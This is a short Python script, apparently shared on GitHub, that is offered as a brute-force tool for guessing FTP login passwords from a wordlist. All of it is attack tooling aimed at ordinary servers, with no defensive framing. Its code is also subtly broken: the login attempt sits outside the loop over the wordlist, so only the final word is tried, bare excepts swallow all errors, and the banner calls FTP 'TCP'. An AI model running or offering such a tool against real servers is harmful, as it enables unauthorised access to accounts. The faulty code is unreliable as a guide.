#!/usr/bin/python3

##Hi, this is a simple brute force for TCP server created by A1le1x (Follow me on GitHub).
import ftplib

print(" ____                        ")
print("/ ___| _   _ _ __   ___ _ __ ")
print("\___ \| | | | '_ \ / _ \ '__|")
print(" ___) | |_| | |_) |  __/ |   ")
print("|____/ \__,_| .__/ \___|_|   ")
print("            |_|              ")
print("")
print("Super, a simple TCP server brute force created by A1le1x")
print("")

server = input("Please put the FTP server address: ")
print("")
user=input("Username: ")
print("")
print("REMEMBER TO RENAME YOUR PASSWORD LIST IN: Passwordlist")

Passwordlist=input("Path to Passwordlist > ")


try:
	with open(Passwordlist, 'r') as pw:
		
		for word in pw:
		
			word=word.strip('\r').strip('\n')
					
		try:
			
			ftp = ftplib.FTP(server)

			ftp.login(user,word)
			
			print('Success!! The password is ' + word)

		except:

			print('Still working...')

except:
	print('Wordlist error')
